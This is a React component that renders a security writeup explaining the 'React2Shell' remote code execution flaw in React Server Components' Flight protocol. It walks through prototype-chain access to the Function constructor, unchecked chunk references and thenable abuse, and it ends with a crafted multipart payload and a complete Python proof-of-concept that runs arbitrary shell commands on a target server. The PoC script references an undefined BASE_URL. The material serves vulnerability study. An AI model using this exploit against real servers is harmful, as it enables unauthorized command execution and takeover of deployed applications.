import { Italic, Share2 } from 'lucide-react'
import { useState } from 'react'
import { CodeBlock, InlineCode } from '@/components/code-block'
import { SplitViewWrapper } from '@/components/split-view-wrapper'

interface WriteupContentProps {
  writeup: any
}

export function React2ShellContent({ writeup }: WriteupContentProps) {
  const [copied, setCopied] = useState(false)

  return (
    <SplitViewWrapper>
      <article className="w-full max-w-3xl mx-auto px-6 py-20">
      <div className="text-center mb-8">
        <p className="text-sm font-mono text-zinc-400">{writeup.date}</p>
      </div>

      <h1 className="text-4xl md:text-5xl font-light text-center mb-6 font-mono leading-tight">
        {writeup.title}
      </h1>

      <div className="text-center mb-8 space-y-4">
        <p className="text-sm text-zinc-400 font-mono">{writeup.subtitle}</p>
        
        <div className="flex items-center justify-center gap-2">
          <Share2 size={16} className={copied ? "text-green-500" : "text-red-500"} />
          <button 
            onClick={() => {
              navigator.clipboard.writeText(window.location.href)
              setCopied(true)
              setTimeout(() => setCopied(false), 2000)
            }}
            className="text-sm font-mono cursor-pointer hover:text-red-400 transition-colors"
          >
            {copied ? "Copied!" : "Share"}
          </button>
        </div>
      </div>

      <div className="text-center mb-16">
        <p className="text-3xl text-white-500 font-bold tracking-widest">
          بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
        </p>
      </div>

      <div className="mb-16">
        <div className="w-full border-2 border-red-500/30 rounded-lg overflow-hidden bg-zinc-900">
          <img
            src={writeup.coverImage}
            alt={writeup.title}
            className="w-full h-96 object-cover"
          />
        </div>
      </div>

      <div className="space-y-8 text-lg leading-relaxed text-zinc-300">
        <p>
          <strong>(Important)</strong> One of the methods to create a function in JS is function constructor
        </p>
        <CodeBlock 
                code={`var func1 = Function()
var func2 = Function(”<function-code>”)
var func3 = Function(”<param>” , “<code>”)`}
                language="javascript"
                fileName="create_function.js"
                showLineNumbers={true}
              />
      
        <p><em><strong>Note: These functions considered as anonymous functions so save it in a variable and call it</strong></em></p>
        <p>The prototype represent the shape of the object (properties, functions, parameters …etc.)</p>
        <div className="mb-16">
            <div className="w-full border-2 border-red-500/30 rounded-lg overflow-hidden bg-zinc-900">
              <img
                src='/writeup-images/react2shell/what_is_proto.png'
                alt={writeup.title}
                className="w-full h-60 object-contain"
              />
            </div>
        </div>

        <p>we can use __proto__ to call a specific functions inside this shape</p>
        <CodeBlock 
                code={`var obj = {}
obj.__proto__.toString() 
alert.__proto__.toString()`}
                language="javascript"
                fileName="call_apply.js"
                showLineNumbers={true}
              />
        <p>We can call the constructor</p>
        <CodeBlock 
                code={`alert.__proto__.constructor // ==> Function() which is a function constructor`}
                language="javascript"
                fileName="call_apply.js"
                showLineNumbers={true}
              />
        <p>We can get the Function constructor but from object <strong>(Obj → Prototype → Function → Construstor)</strong></p>
        <CodeBlock 
                code={`var x = {}
var func7 = x.__proto__.toString.constructor("alert()")`}
                language="javascript"
                fileName="alert1.js"
                showLineNumbers={true}
              />
        <p>the constructor also considered as function</p>
                <CodeBlock 
                code={`var x = {}
var func7 = x.__proto__.constructor.constructor("alert()")`}
                language="javascript"
                fileName="alert2.js"
                showLineNumbers={true}
              />
         <div className="w-full border-2 border-red-500/30 rounded-lg overflow-hidden bg-zinc-900 my-6">
          <img
            src="/writeup-images/react2shell/alert.png"
            alt="Home page"
            className="w-full h-auto object-cover"
          />
        </div>

        <p>First suspection part: Flight Protocol which make the data represented as chunks</p>
        <p>And we can reference data from another chunk using the '$' sign</p>
        <CodeBlock 
                code={`files = {
    "0": (None, '["$1"]'),  // $1 -> means get the data in the chunck 1
    "1": (None, '{"object":"fruit","name":"$2:fruitName"}'), // Go to chunck 2 and get the property fruitName from it
    "2": (None, '{"fruitName":"cherry"}'),
}`}
                language="javascript"
                fileName="alert2.js"
                showLineNumbers={true}
              />
        <CodeBlock 
                code={`{ object: 'fruit', name: 'cherry' }`}
                language="output"
                fileName="OUTPUT"
                showLineNumbers={true}
              />
        <p>The problem is there’s no check on the referencing of this chunks, which means we can refer to anything we want (That’s the problem!)</p>
        
        <p>So, we can create a function constructor inside the chunks by calling any function's constructor inside the prototype</p>
        <CodeBlock 
                code={`files = {
    "0": (None, '{"then":"$1:__proto__:constructor:constructor"}'),
    "1": (None, '{"x":1}'),
}`}
                language="javascript"
                fileName="function_constructor2.js"
                showLineNumbers={true}
              />
        Which means:
        <CodeBlock 
                code={`files= {
	"0": (None, '{"then":"{"x":1}:__proto__:constructor:constructor"}'),
}`}
                language="javascript"
                fileName="function_constructor2.js"
                showLineNumbers={true}
              />
        Which means:
        <CodeBlock 
                code={`{"x":1}.__proto__.constructor.constructor`}
                language="javascript"
                fileName="function_constructor2.js"
                showLineNumbers={true}
              />
        OUTPUT:
        Which means:
        <CodeBlock 
                code={`[Function: Function]`}
                language="output"
                fileName="OUTPUT"
                showLineNumbers={true}
              />
        <p>Now, we need to:</p>
        <ul className="list-disc list-inside space-y-2">
          <li>Call this function</li>
          <li>Inject a code inside it</li>
        </ul>

        <p>We've noticed in a file called <i>action-handler.ts</i> that the chunks are taken with await keyword and return the value without any checks, so to use this, we will create the function as a Thenable function</p>
        <div className="w-full border-2 border-red-500/30 rounded-lg overflow-hidden bg-zinc-900 my-6">
          <img
            src="/writeup-images/react2shell/action-handler.png"
            alt="Home page"
            className="w-full h-auto object-cover"
          />
        </div>
        <div className="w-full border-2 border-red-500/30 rounded-lg overflow-hidden bg-zinc-900 my-6">
          <img
            src="/writeup-images/react2shell/thenable.png"
            alt="Home page"
            className="w-full h-auto object-cover"
          />
        </div>
        <p>To Create it as thenable function we need to access the then property of the function constructor or access it from the prototype directly.</p>
        <CodeBlock 
                code={`files = {
    "0": (None, '{"then":"$1:__proto__:then"}'),
    "1": (None, '{"x":1}'),
}`}
                language="javascript"
                fileName="thenable.js"
                showLineNumbers={true}
              />
        <p>But if we go more inside, we will notice in the following code snippet we need to thenable to the whole chunk object not just its data</p>
         <div className="w-full border-2 border-red-500/30 rounded-lg overflow-hidden bg-zinc-900 my-6">
          <img
            src="/writeup-images/react2shell/chunk_then.png"
            alt="Home page"
            className="w-full h-auto object-cover"
          />
        </div>
        <p>So, we will use another shape of referring, we will '$@' sign to refer to the chunk object itself, not just its data</p>
        <CodeBlock 
                code={`files = {
	"0" : (None, "{'then':'$1:__proto__:then'}"),
	"1" : (None, "$@0")
}`}
                language="javascript"
                fileName="thenable.js"
                showLineNumbers={true}
              />
        which means:
        <CodeBlock 
                code={`Chunk.__proto__.then = function(resolve, reject) {
	// Code Injection Vuln.
}`}
                language="javascript"
                fileName="thenable.js"
                showLineNumbers={true}
              />
        <p>To get inside the interesting function that we hightlighted in the previous screen shot we should make status value be "resolved_model"</p>
        <CodeBlock 
                code={`files = {
	"0" : (None, "{'then':'$1:__proto__:then', 'status':'resolved_model'}"),
	"1" : (None, "$@0")
}`}
                language="javascript"
                fileName="thenable.js"
                showLineNumbers={true}
              />

        <CodeBlock 
                code={`Chunk.__proto__.then = function(resolve, reject, 'status' == 'resolved_model') {
	// Code Injection Vuln.
}`}
                language="javascript"
                fileName="thenable.js"
                showLineNumbers={true}
              />
        <p>Now, we created the function and make it called, and we are inside the vulnerable function `initializeModelChunk` that we want to exploit.</p>

        <p>All we need now is to override this function to inject our payload that will leads to RCE</p>
        <CodeBlock 
          code={`function initializeModelChunk(chunk) {
    // ...
    var rawModel = JSON.parse(resolvedModel),
        value = reviveModel(chunk._response, { "": rawModel }, "", rawModel, rootReference);
    // ...
}`}
                language="javascript"
                fileName="initializeModelChunk.js"
                showLineNumbers={true}
              />
        <p>So, the vulnerable function take a property from 'chunk' called _response and pass it modelRevive function</p>
        <CodeBlock 
          code={`case "B":
  return (
    (obj = parseInt(value.slice(2), 16)),
    response._formData.get(response._prefix + obj)
  );`}
                language="javascript"
                fileName="reviveModel.js"
                showLineNumbers={true}
              />
        <p>Inside the function, there's a get function that we will override and take a _perfix proprty from the _response object and case 'B'</p>

        <p>So, The Complete Payload steps</p>
        <ul className="list-disc list-inside space-y-2">
          <li>Referr to the chunk object itself using '$@'</li>
          <li>Create a function constructor inside the chunk</li>
          <li>Make it thenable to be called and set status as "resolved_model"</li>
          <li>Edit the _response object to inject our payload</li>
          <li>Override the get function to make function constructor which will take the _perfix property from us</li>
          <li>Make the _perfix property a System command code</li>
        </ul>
         <CodeBlock 
          code={`crafted_chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        "_prefix": f"process.mainModule.require('child_process').execSync('calc');",
        "_formData": {
            "get": "$1:constructor:constructor",
        },
    },
}

files = {
    "0": (None, json.dumps(crafted_chunk)),
    "1": (None, '"$@0"'),
}`}
                language="javascript"
                fileName="RCE.js"
                showLineNumbers={true}
              />
      <p>You can use the following python script as a PoC:</p>
      <CodeBlock 
          code={`
import requests
import sys
import json

TARGET_URL = "http://localhost:3000"
COMMAND =  "id"

crafted_chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        "_prefix": f"var res = process.mainModule.require('child_process').execSync('{COMMAND}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:\${res}}});",
        "_formData": {
            "get": "$1:constructor:constructor",
        },
    },
}

files = {
    "0": (None, json.dumps(crafted_chunk)),
    "1": (None, '"$@0"'),
}

headers = {"Next-Action": "x"}
res = requests.post(BASE_URL, files=files, headers=headers, timeout=10)
print(res.status_code)
print(res.text)`}
                language="python"
                fileName="React2Shell.py"
                showLineNumbers={true}
              />
      </div>
    </article>
    </SplitViewWrapper>
  )
}
